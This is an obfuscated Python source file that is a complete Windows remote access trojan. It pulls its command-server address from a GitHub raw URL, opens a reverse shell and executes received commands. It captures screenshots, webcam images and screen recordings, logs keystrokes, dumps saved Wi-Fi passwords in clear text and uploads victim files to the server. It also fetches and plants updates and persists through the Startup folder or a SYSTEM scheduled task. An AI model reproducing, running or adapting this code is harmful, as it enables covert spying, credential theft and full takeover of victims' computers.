import urllib.request,subprocess,socket,time,os,json,base64,shutil,re,ctypes
from datetime import datetime
xWsMHxWdLeGD = ""
tDCktvnJFhbcTI = ""
XPXxtGfmAyTlaM = "01.08.26.0"
nRYdqiHRYQQkmsCvZzH = True
TiZQuVeowhUZIUmJwa = "!"
saQlDUQkfxBFCek = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
KQnwtIoewWjelD = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
uUgkRggmynmJ = ""
def is_elevated():
	try:
		return os.geteuid() == 0
	except AttributeError:
		return ctypes.windll.shell32.IsUserAnAdmin() != 0
STARTUP_PATH = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup") if not is_elevated() else "C:\\ProgramData\\MicrosoftUpdater\\"
DKjImKNUfuUCBHMSMw = os.path.expanduser("~\\AppData\\Local\\") if not is_elevated() else STARTUP_PATH
try:
	if not os.path.exists(DKjImKNUfuUCBHMSMw):
		os.mkdir(DKjImKNUfuUCBHMSMw)
except:
	pass
def pgJATzXrwWWsB(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def ZlEAdGSwrfqW(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	uWSjCbklBNSqcCdAhAGO = data.decode("utf-8").replace("\n","")
	if not uWSjCbklBNSqcCdAhAGO.startswith(TiZQuVeowhUZIUmJwa):
		proc = subprocess.run(uWSjCbklBNSqcCdAhAGO, shell=True, capture_output=True)
		iZhrLBSxTwswUpDpRNCVuWF = proc.stdout + proc.stderr
		oWcuPZslYpOkhxdnOchcp(s, iZhrLBSxTwswUpDpRNCVuWF)
		return
	ubWmkdLBMBjtCKL = uWSjCbklBNSqcCdAhAGO.split(" ")[0][1:]
	args = " ".join(uWSjCbklBNSqcCdAhAGO.split()[1:]).split()
	if ubWmkdLBMBjtCKL == "cd":
		moveDirectory(s, uWSjCbklBNSqcCdAhAGO[4:])
	elif ubWmkdLBMBjtCKL == "screenshot":
		JqoLIkldzcLZJKGbeG(s)
	elif ubWmkdLBMBjtCKL == "webcam":
		XMSVLvhXbrOp(s, args)
	elif ubWmkdLBMBjtCKL == "download":
		CDxnsTjQ(s, uWSjCbklBNSqcCdAhAGO)
	elif ubWmkdLBMBjtCKL == "upload":
		ENiApBqCdZLhQRTv(s, uWSjCbklBNSqcCdAhAGO)
	elif ubWmkdLBMBjtCKL == "wifi":
		antsQAIbukArbZWVfsnqxN(s)
	elif ubWmkdLBMBjtCKL == "screenrecord":
		erKqBmIXfJtunBcF(s, args)
	elif ubWmkdLBMBjtCKL == "update":
		QCGMLcjoHFAICisFficeq(s)
	elif ubWmkdLBMBjtCKL == "basename":
		oWcuPZslYpOkhxdnOchcp(s, os.path.basename(__file__))
	else:
		oWcuPZslYpOkhxdnOchcp(s,"")
def moveDirectory(s, path):
	try:
		os.chdir(path)
		oWcuPZslYpOkhxdnOchcp(s,"")
	except:
		oWcuPZslYpOkhxdnOchcp(s, "[!] 404")
def CDxnsTjQ(s, uWSjCbklBNSqcCdAhAGO):
	nrlkJcmLw = uWSjCbklBNSqcCdAhAGO.replace(TiZQuVeowhUZIUmJwa+"download ","").split(",")
	iZhrLBSxTwswUpDpRNCVuWFs = ""
	for f in nrlkJcmLw:
		iZhrLBSxTwswUpDpRNCVuWFs += hszsHjspNKKrm(f, "api/file/", { "type":os.path.splitext(f)[1] })
	oWcuPZslYpOkhxdnOchcp(s, iZhrLBSxTwswUpDpRNCVuWFs)
def JqoLIkldzcLZJKGbeG(s):
	from PIL.ImageGrab import grab
	global DKjImKNUfuUCBHMSMw
	image = grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	jcKVUToVuyEANGj = os.path.join(DKjImKNUfuUCBHMSMw, "ss.jpg")
	image.save(jcKVUToVuyEANGj)
	image.close()
	iZhrLBSxTwswUpDpRNCVuWF = hszsHjspNKKrm(jcKVUToVuyEANGj, "api/sscap")
	os.remove(jcKVUToVuyEANGj)
	oWcuPZslYpOkhxdnOchcp(s, iZhrLBSxTwswUpDpRNCVuWF)
def XMSVLvhXbrOp(s, args):
	from cv2 import VideoCapture, imwrite
	cameraNumber = 0
	fname = "wc.jpg"
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		cam = VideoCapture(cameraNumber)
		_, frame = cam.read()
		imwrite(DKjImKNUfuUCBHMSMw+fname, frame)
		cam.release()
		r=hszsHjspNKKrm(DKjImKNUfuUCBHMSMw+fname,"api/wc")
		os.remove(DKjImKNUfuUCBHMSMw+fname)
		oWcuPZslYpOkhxdnOchcp(s, r)
	except Exception as e:
		oWcuPZslYpOkhxdnOchcp(s, "[!] 404: "+str(e))
def erKqBmIXfJtunBcF(s, args):
	from imageio import mimsave
	from PIL.ImageGrab import grab
	global DKjImKNUfuUCBHMSMw
	stORIUJlFIpwFUHhrt = 15
	if not args == []:
		try: stORIUJlFIpwFUHhrt = int(args[0])
		except: pass
	nUhjMOiWjiISSOrdAlyiP = os.path.expanduser(DKjImKNUfuUCBHMSMw, "sr.mp4")
	hZuyyMSExVUQx = []
	fps = 11
	numFrames = stORIUJlFIpwFUHhrt * fps
	for _ in range(numFrames):
		hZuyyMSExVUQx.append(grab(bbox=None, all_screens=True))
	mimsave(nUhjMOiWjiISSOrdAlyiP, hZuyyMSExVUQx, fps=fps, quality=8)
	r=hszsHjspNKKrm(nUhjMOiWjiISSOrdAlyiP, "api/screc")
	os.remove(nUhjMOiWjiISSOrdAlyiP)
	oWcuPZslYpOkhxdnOchcp(s, r)
def hszsHjspNKKrm(AqhuIZpFcblsRu, mVFZpfYyDMon, uSZtSCmGCYjFHbeir=None):
	from requests import post
	if not os.path.isfile(AqhuIZpFcblsRu):
		return "[!] 404: "+AqhuIZpFcblsRu+"\n"
	headers = {"user":os.getlogin()}
	if uSZtSCmGCYjFHbeir is not None:
		headers = {**headers, **uSZtSCmGCYjFHbeir}
	f = open(AqhuIZpFcblsRu, "rb")
	post("http://"+xWsMHxWdLeGD+":5555/"+mVFZpfYyDMon,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def ENiApBqCdZLhQRTv(s, uWSjCbklBNSqcCdAhAGO):
	from requests import get
	CylRBLNsj = uWSjCbklBNSqcCdAhAGO.split(" ")[-1]
	QONTmZmeSTEC = uWSjCbklBNSqcCdAhAGO.replace(TiZQuVeowhUZIUmJwa+"upload ","").replace(" "+CylRBLNsj,"")
	if os.path.exists(QONTmZmeSTEC) or os.path.isfile(QONTmZmeSTEC):
		oWcuPZslYpOkhxdnOchcp(s, "[!] 409")
		return
	response = get(f"http://{xWsMHxWdLeGD}:5555/api/content/{CylRBLNsj}", headers={"auth":"981xyz"})
	if response.status_code != 200:
		oWcuPZslYpOkhxdnOchcp(s, "[!] 404")
		return
	with open(QONTmZmeSTEC, "wb") as f:
		f.write(response.content)
	oWcuPZslYpOkhxdnOchcp(s, "[+] 200")
def bQJtspyFNxxZNtMHXhwXda(YCwgkOpJtwLgpaCOff, mVFZpfYyDMon):
	from requests import post
	if YCwgkOpJtwLgpaCOff.strip() == "":
		return "[!] 204"
	post("http://"+xWsMHxWdLeGD+":5555/"+mVFZpfYyDMon,
		data=YCwgkOpJtwLgpaCOff,
		headers={"user":os.getlogin()})
	return "[+] 200"
def QCGMLcjoHFAICisFficeq(s):
	h, p, v = onpUcwVjweJYdh(True)
	if (v != XPXxtGfmAyTlaM):
		CjeEGiTBSS(v)
		oWcuPZslYpOkhxdnOchcp(s, "[+] 200")
	else:
		oWcuPZslYpOkhxdnOchcp(s, "[-] 304")
def antsQAIbukArbZWVfsnqxN(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		oWcuPZslYpOkhxdnOchcp(s, "[!] 500")
		return
	CknELpzSSQsUwoopfqwd = ""
	for p in profiles:
		try: CknELpzSSQsUwoopfqwd+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: CknELpzSSQsUwoopfqwd+=f"    {p} - N/A"
	oWcuPZslYpOkhxdnOchcp(s, CknELpzSSQsUwoopfqwd)
def CjeEGiTBSS(aJPEpCVlWbwVp):
	import sys
	from requests import get
	global nRYdqiHRYQQkmsCvZzH, STARTUP_PATH
	p = sys.executable if getattr(sys, "frozen", False) else __file__
	name, ext = os.path.basename(p).split('.')[0], os.path.splitext(p)[1]
	py = ext.startswith(".py")
	file = f"{name}.{aJPEpCVlWbwVp}.{'pyw' if py else 'exe'}"
	source = f"file.{'pyw' if py else 'exe'}"
	path = os.path.join(STARTUP_PATH, file)
	if not os.path.isfile(path):
		r = get(KQnwtIoewWjelD + source)
		with open(path, "w" if py else "wb") as f:
			f.write(r.text if py else r.content)
		if is_elevated():
			path = f'"{sys.executable}" "{path}"' if py else path
			subprocess.run([ "schtasks", "/create", "/tn", "Updater", "/tr", path, "/sc", "onstart", "/ru", "SYSTEM", "/rl", "highest", "/f"], creationflags=subprocess.CREATE_NO_WINDOW)
	else:
		nRYdqiHRYQQkmsCvZzH = False
def onpUcwVjweJYdh(force=False):
	global xWsMHxWdLeGD, tDCktvnJFhbcTI
	if force or xWsMHxWdLeGD == "" or tDCktvnJFhbcTI == "":
		while True:
			try:
				with urllib.request.urlopen(saQlDUQkfxBFCek) as response:
					data = response.read().decode("utf-8").replace("\n","").split(":")
					xWsMHxWdLeGD = data[0].strip()
					tDCktvnJFhbcTI = data[1].strip()
					aJPEpCVlWbwVp = data[2].strip()
					return xWsMHxWdLeGD, tDCktvnJFhbcTI, aJPEpCVlWbwVp
			except:
				time.sleep(10)
def TViXwYzaupgxhlid():
	try:
		ghssWeajBwKTLMfy = "settings.xpb"
		VbKkGleGUJHOXqT = sorted([file for file in os.listdir(DKjImKNUfuUCBHMSMw) if os.path.isfile(DKjImKNUfuUCBHMSMw+"\\"+file) and file.endswith(ghssWeajBwKTLMfy.split(".")[-1])])
		if ghssWeajBwKTLMfy in VbKkGleGUJHOXqT:
			VbKkGleGUJHOXqT.remove(ghssWeajBwKTLMfy)
		OBhcKHUFgCyKgIXkdSTfKe = os.path.join(DKjImKNUfuUCBHMSMw,ghssWeajBwKTLMfy)
		if len(VbKkGleGUJHOXqT) > 0:
			with open(OBhcKHUFgCyKgIXkdSTfKe, "ab+") as f:
				for file in VbKkGleGUJHOXqT:
					temp = os.path.join(DKjImKNUfuUCBHMSMw,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		hszsHjspNKKrm(OBhcKHUFgCyKgIXkdSTfKe, "api/log")
		if os.path.isfile(OBhcKHUFgCyKgIXkdSTfKe):
			os.remove(OBhcKHUFgCyKgIXkdSTfKe)
	except:
		pass
def UNAwWaEtMeXmIUh():
	from pynput.keyboard import Listener
	import logging
	logging.basicConfig(filename=(DKjImKNUfuUCBHMSMw+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def PGAfFGPqvRZqmdZqzePjbMz(k):
		logging.info(str(k))
	k=Listener(on_press=PGAfFGPqvRZqmdZqzePjbMz)
	kSwInlEuZxZuLopTgZbkO = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in kSwInlEuZxZuLopTgZbkO:
		l.setLevel(logging.CRITICAL)
	k.start()
def oWcuPZslYpOkhxdnOchcp(clientSocket, YCwgkOpJtwLgpaCOff):
	formattedData = b""
	if type(YCwgkOpJtwLgpaCOff) == bytes:
		formattedData += YCwgkOpJtwLgpaCOff
	else:
		formattedData += bytes(YCwgkOpJtwLgpaCOff, "utf-8")
	formattedData += bytes("\n"+uUgkRggmynmJ+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def lwtUwkJ():
	global uUgkRggmynmJ
	h, p, v = onpUcwVjweJYdh()
	try: TViXwYzaupgxhlid()
	except: pass
	try:
		if XPXxtGfmAyTlaM != v:
			CjeEGiTBSS(v)
	except: pass
	try:
		if nRYdqiHRYQQkmsCvZzH:
			UNAwWaEtMeXmIUh()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	uUgkRggmynmJ = ("(old)"if XPXxtGfmAyTlaM!=v else "")+"["+XPXxtGfmAyTlaM+"] "+(os.getlogin() if os.getlogin() != "SYSTEM" else socket.gethostname())+" - "
	while True:
		shZgijXXQZZvQzfMXP=False
		try:
			s=pgJATzXrwWWsB(h, p)
			oWcuPZslYpOkhxdnOchcp(s, "")
			while not shZgijXXQZZvQzfMXP:
				try: shZgijXXQZZvQzfMXP=ZlEAdGSwrfqW(s)
				except Exception as e:
					oWcuPZslYpOkhxdnOchcp(s, str(e))
			s.close()
		except:
			pass
		time.sleep(5)
lwtUwkJ()
